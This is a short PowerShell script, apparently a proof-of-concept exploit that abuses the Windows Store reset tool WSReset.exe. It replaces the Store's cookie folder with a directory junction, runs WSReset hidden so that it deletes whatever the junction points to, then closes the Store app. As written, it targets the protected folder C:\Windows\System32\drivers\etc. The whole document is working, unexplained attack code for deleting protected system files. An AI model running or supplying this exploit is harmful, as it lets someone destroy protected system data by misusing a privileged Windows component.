function clearfolder($foldername){
# get store cookies folder
$storefolder = ($env:LOCALAPPDATA + "\Packages\Microsoft.WindowsStore_8wekyb3d8bbwe\AC\INetCookies\")
# delete folder
Remove-Item $storefolder -Recurse -Force -ErrorAction SilentlyContinue
# create junction
New-Item -ItemType Junction -Path $storefolder -Target $foldername -ErrorAction SilentlyContinue >$null 2>&1
# start wreset
Start-Process "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
# close winstore app
while($true){
if ((Get-Process 'WinStore.App' -ErrorAction SilentlyContinue).WorkingSet -gt 1) {
Stop-Process -Name 'WinStore.App'
Write-Host 'Finished'
exit
}
}
}

clearfolder -foldername 'C:\Windows\System32\drivers\etc'